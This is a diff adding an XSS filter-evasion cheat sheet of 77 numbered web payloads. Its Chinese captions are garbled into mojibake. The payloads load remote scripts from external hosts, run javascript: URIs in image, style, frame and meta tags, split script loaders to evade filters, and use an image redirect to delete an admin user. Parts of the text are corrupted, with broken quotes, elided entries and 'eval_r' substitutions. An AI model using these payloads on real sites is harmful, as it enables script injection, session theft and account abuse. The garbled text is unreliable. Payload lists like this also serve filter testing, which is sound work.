@@ -1,0 +1,250 @@
+Ã²ËÆ¹ØÓÚxssµÄ×ÊÁÏt00ls±È½ÏÉÙ£¬¿´¼ûºÃ¶«Î÷Copy¹ıÀ´£¬²»ÖªµÀÓĞÄ¾ÓĞÍ¯Ğ¬ĞèÒªMarkµÄ¡£
+
+ (1)ÆÕÍ¨µÄXSS JavaScript×¢Èë
+ <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+
+ (2)IMG±êÇ©XSSÊ¹ÓÃJavaScriptÃüÁî
+ <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+
+ (3)IMG±êÇ©ÎŞ·ÖºÅÎŞÒıºÅ
+ <IMG SRC=javascript:alert(¡®XSS¡¯)>
+
+ (4)IMG±êÇ©´óĞ¡Ğ´²»Ãô¸Ğ
+ <IMG SRC=JaVaScRiPt:alert(¡®XSS¡¯)>
+
+ (5)HTML±àÂë(±ØĞëÓĞ·ÖºÅ)
+ <IMG SRC=javascript:alert(¡°XSS¡±)>
+
+ (6)ĞŞÕıÈ±ÏİIMG±êÇ©
+ <IMG ¡°¡±"><SCRIPT>alert(¡°XSS¡±)</SCRIPT>¡±>
+
+ (7)formCharCode±êÇ©(¼ÆËãÆ÷)
+ <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+ (8)UTF-8µÄUnicode±àÂë(¼ÆËãÆ÷)
+ <IMG SRC=jav..Ê¡ÂÔ..S')>
+
+ (9)7Î»µÄUTF-8µÄUnicode±àÂëÊÇÃ»ÓĞ·ÖºÅµÄ(¼ÆËãÆ÷)
+ <IMG SRC=jav..Ê¡ÂÔ..S')>
+
+ (10)Ê®Áù½øÖÆ±àÂëÒ²ÊÇÃ»ÓĞ·ÖºÅ(¼ÆËãÆ÷)
+ <IMG SRC=&#x6A&#x61&#x76&#x61..Ê¡ÂÔ..&#x58&#x53&#x53&#x27&#x29>
+
+ (11)Ç¶ÈëÊ½±êÇ©,½«Javascript·Ö¿ª
+ <IMG SRC=¡±jav ascript:alert(¡®XSS¡¯);¡±>
+
+ (12)Ç¶ÈëÊ½±àÂë±êÇ©,½«Javascript·Ö¿ª
+ <IMG SRC=¡±jav ascript:alert(¡®XSS¡¯);¡±>
+
+ (13)Ç¶ÈëÊ½»»ĞĞ·û
+ <IMG SRC=¡±jav ascript:alert(¡®XSS¡¯);¡±>
+
+ (14)Ç¶ÈëÊ½»Ø³µ
+ <IMG SRC=¡±jav ascript:alert(¡®XSS¡¯);¡±>
+
+ (15)Ç¶ÈëÊ½¶àĞĞ×¢ÈëJavaScript,ÕâÊÇXSS¼«¶ËµÄÀı×Ó
+ <IMG SRC=¡±javascript:alert(¡®XSS¡®)¡±>
+
+ (16)½â¾öÏŞÖÆ×Ö·û(ÒªÇóÍ¬Ò³Ãæ)
+ <script>z=¡¯document.¡¯</script>
+ <script>z=z+¡¯write(¡°¡®</script>
+ <script>z=z+¡¯<script¡¯</script>
+ <script>z=z+¡¯ src=ht¡¯</script>
+ <script>z=z+¡¯tp://ww¡¯</script>
+ <script>z=z+¡¯w.shell¡¯</script>
+ <script>z=z+¡¯.net/1.¡¯</script>
+ <script>z=z+¡¯js></sc¡¯</script>
+ <script>z=z+¡¯ript>¡±)¡¯</script>
+ <script>eval_r(z)</script>
+
+ (17)¿Õ×Ö·û
+ perl -e ¡®print ¡°<IMG SRC=java\0script:alert(\¡±XSS\¡±)>¡±;¡¯ > out
+
+ (18)¿Õ×Ö·û2,¿Õ×Ö·ûÔÚ¹úÄÚ»ù±¾Ã»Ğ§¹û.ÒòÎªÃ»ÓĞµØ·½¿ÉÒÔÀûÓÃ
+ perl -e ¡®print ¡°<SCR\0IPT>alert(\¡±XSS\¡±)</SCR\0IPT>¡±;¡¯ > out
+
+ (19)SpacesºÍmetaÇ°µÄIMG±êÇ©
+ <IMG SRC=¡±   javascript:alert(¡®XSS¡¯);¡±>
+
+ (20)Non-alpha-non-digit XSS
+ <SCRIPT/XSS SRC=¡±http://3w.org/XSS/xss.js¡±></SCRIPT>
+
+ (21)Non-alpha-non-digit XSS to 2
+ <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(¡°XSS¡±)>
+
+ (22)Non-alpha-non-digit XSS to 3
+ <SCRIPT/SRC=¡±http://3w.org/XSS/xss.js¡±></SCRIPT>
+
+ (23)Ë«¿ªÀ¨ºÅ
+ <<SCRIPT>alert(¡°XSS¡±);//<</SCRIPT>
+
+ (24)ÎŞ½áÊø½Å±¾±ê¼Ç(½ö»ğºüµÈä¯ÀÀÆ÷)
+ <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
+
+ (25)ÎŞ½áÊø½Å±¾±ê¼Ç2
+ <SCRIPT SRC=//3w.org/XSS/xss.js>
+
+ (26)°ë¿ªµÄHTML/JavaScript XSS
+ <IMG SRC=¡±javascript:alert(¡®XSS¡¯)¡±
+
+ (27)Ë«¿ª½ÇÀ¨ºÅ
+ <iframe src=http://3w.org/XSS.html <
+
+ (28)ÎŞµ¥ÒıºÅ Ë«ÒıºÅ ·ÖºÅ
+ <SCRIPT>a=/XSS/
+ alert(a.source)</SCRIPT>
+
+ (29)»»Âë¹ıÂËµÄJavaScript
+ \¡±;alert(¡®XSS¡¯);//
+
+ (30)½áÊøTitle±êÇ©
+ </TITLE><SCRIPT>alert(¡°XSS¡±);</SCRIPT>
+
+ (31)Input Image
+ <INPUT SRC=¡±javascript:alert(¡®XSS¡¯);¡±>
+
+ (32)BODY Image
+ <BODY BACKGROUND=¡±javascript:alert(¡®XSS¡¯)¡±>
+
+ (33)BODY±êÇ©
+ <BODY(¡®XSS¡¯)>
+
+ (34)IMG Dynsrc
+ <IMG DYNSRC=¡±javascript:alert(¡®XSS¡¯)¡±>
+
+ (35)IMG Lowsrc
+ <IMG LOWSRC=¡±javascript:alert(¡®XSS¡¯)¡±>
+
+ (36)BGSOUND
+ <BGSOUND SRC=¡±javascript:alert(¡®XSS¡¯);¡±>
+
+ (37)STYLE sheet
+ <LINK REL=¡±stylesheet¡± HREF=¡±javascript:alert(¡®XSS¡¯);¡±>
+
+ (38)Ô¶³ÌÑùÊ½±í
+ <LINK REL=¡±stylesheet¡± HREF=¡±http://3w.org/xss.css¡±>
+
+ (39)List-style-image(ÁĞ±íÊ½)
+ <STYLE>li {list-style-image: url(¡°javascript:alert(¡®XSS¡¯)¡±);}</STYLE><UL><LI>XSS
+
+ (40)IMG VBscript
+ <IMG SRC=¡¯vbscript:msgbox(¡°XSS¡±)¡¯></STYLE><UL><LI>XSS
+
+ (41)METAÁ´½Óurl
+ <META HTTP-EQUIV=¡±refresh¡± CONTENT=¡±0; URL=http://;URL=javascript:alert(¡®XSS¡¯);¡±>
+
+ (42)Iframe
+ <IFRAME SRC=¡±javascript:alert(¡®XSS¡¯);¡±></IFRAME>
+
+ (43)Frame
+ <FRAMESET><FRAME SRC=¡±javascript:alert(¡®XSS¡¯);¡±></FRAMESET>
+
+ (44)Table
+ <TABLE BACKGROUND=¡±javascript:alert(¡®XSS¡¯)¡±>
+
+ (45)TD
+ <TABLE><TD BACKGROUND=¡±javascript:alert(¡®XSS¡¯)¡±>
+
+ (46)DIV background-image
+ <DIV STYLE=¡±background-image: url(javascript:alert(¡®XSS¡¯))¡±>
+
+ (47)DIV background-imageºó¼ÓÉÏ¶îÍâ×Ö·û(1-32&34&39&160&8192-8&13&12288&65279)
+ <DIV STYLE=¡±background-image: url(javascript:alert(¡®XSS¡¯))¡±>
+
+ (48)DIV expression
+ <DIV STYLE=¡±width: expression_r(alert(¡®XSS¡¯));¡±>
+
+ (49)STYLEÊôĞÔ·Ö²ğ±í´ï
+ <IMG STYLE=¡±xss:expression_r(alert(¡®XSS¡¯))¡±>
+
+ (50)ÄäÃûSTYLE(×é³É:¿ª½ÇºÅºÍÒ»¸ö×ÖÄ¸¿ªÍ·)
+ <XSS STYLE=¡±xss:expression_r(alert(¡®XSS¡¯))¡±>
+
+ (51)STYLE background-image
+ <STYLE>.XSS{background-image:url(¡°javascript:alert(¡®XSS¡¯)¡±);}</STYLE><A CLASS=XSS></A>
+
+ (52)IMG STYLE·½Ê½
+ exppression(alert(¡°XSS¡±))¡¯>
+
+ (53)STYLE background
+ <STYLE><STYLE type=¡±text/css¡±>BODY{background:url(¡°javascript:alert(¡®XSS¡¯)¡±)}</STYLE>
+
+ (54)BASE
+ <BASE HREF=¡±javascript:alert(¡®XSS¡¯);//¡±>
+
+ (55)EMBED±êÇ©,Äã¿ÉÒÔÇ¶ÈëFLASH,ÆäÖĞ°üº­XSS
+ <EMBED SRC=¡±http://3w.org/XSS/xss.swf¡± ></EMBED>
+
+ (56)ÔÚflashÖĞÊ¹ÓÃActionScrpt¿ÉÒÔ»ì½øÄãXSSµÄ´úÂë
+ a=¡±get¡±;
+ b=¡±URL(\¡±";
+ c=¡±javascript:¡±;
+ d=¡±alert(¡®XSS¡¯);\¡±)¡±;
+ eval_r(a+b+c+d);
+
+ (57)XML namespace.HTCÎÄ¼ş±ØĞëºÍÄãµÄXSSÔØÌåÔÚÒ»Ì¨·şÎñÆ÷ÉÏ
+ <HTML xmlns:xss>
+ <?import namespace=¡±xss¡± implementation=¡±http://3w.org/XSS/xss.htc¡±>
+ <xss:xss>XSS</xss:xss>
+ </HTML>
+
+ (58)Èç¹û¹ıÂËÁËÄãµÄJSÄã¿ÉÒÔÔÚÍ¼Æ¬ÀïÌí¼ÓJS´úÂëÀ´ÀûÓÃ
+ <SCRIPT SRC=¡±¡±></SCRIPT>
+
+ (59)IMGÇ¶ÈëÊ½ÃüÁî,¿ÉÖ´ĞĞÈÎÒâÃüÁî
+ <IMG SRC=¡±http://www.XXX.com/a.php?a=b¡±>
+
+ (60)IMGÇ¶ÈëÊ½ÃüÁî(a.jpgÔÚÍ¬·şÎñÆ÷)
+ Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser
+
+ (61)ÈÆ·ûºÅ¹ıÂË
+ <SCRIPT a=¡±>¡± SRC=¡±http://3w.org/xss.js¡±></SCRIPT>
+
+ (62)
+ <SCRIPT =¡±>¡± SRC=¡±http://3w.org/xss.js¡±></SCRIPT>
+
+ (63)
+ <SCRIPT a=¡±>¡± ¡± SRC=¡±http://3w.org/xss.js¡±></SCRIPT>
+
+ (64)
+ <SCRIPT ¡°a=¡¯>¡¯¡± SRC=¡±http://3w.org/xss.js¡±></SCRIPT>
+
+ (65)
+ <SCRIPT a=`>` SRC=¡±http://3w.org/xss.js¡±></SCRIPT>
+
+ (66)
+ <SCRIPT a=¡±>¡¯>¡± SRC=¡±http://3w.org/xss.js¡±></SCRIPT>
+
+ (67)
+ <SCRIPT>document.write(¡°<SCRI¡±);</SCRIPT>PT SRC=¡±http://3w.org/xss.js¡±></SCRIPT>
+
+ (68)URLÈÆĞĞ
+ <A HREF=¡±http://127.0.0.1/¡±>XSS</A>
+
+ (69)URL±àÂë
+ <A HREF=¡±http://3w.org¡±>XSS</A>
+
+ (70)IPÊ®½øÖÆ
+ <A HREF=¡±http://3232235521¡å>XSS</A>
+
+ (71)IPÊ®Áù½øÖÆ
+ <A HREF=¡±http://0xc0.0xa8.0¡Á00.0¡Á01¡å>XSS</A>
+
+ (72)IP°Ë½øÖÆ
+ <A HREF=¡±http://0300.0250.0000.0001¡å>XSS</A>
+
+ (73)»ìºÏ±àÂë
+ <A HREF=¡±h
+ tt p://6 6.000146.0¡Á7.147/¡±">XSS</A>
+
+ (74)½ÚÊ¡[http:]
+ <A HREF=¡±//www.google.com/¡±>XSS</A>
+
+ (75)½ÚÊ¡[www]
+ <A HREF=¡±http://google.com/¡±>XSS</A>
+
+ (76)¾ø¶Ôµã¾ø¶ÔDNS
+ <A HREF=¡±http://www.google.com./¡±>XSS</A>
+
+ (77)javascriptÁ´½Ó
+ <A HREF=¡±javascript:document.location=¡¯http://www.google.com/¡¯¡±>XSS</A>
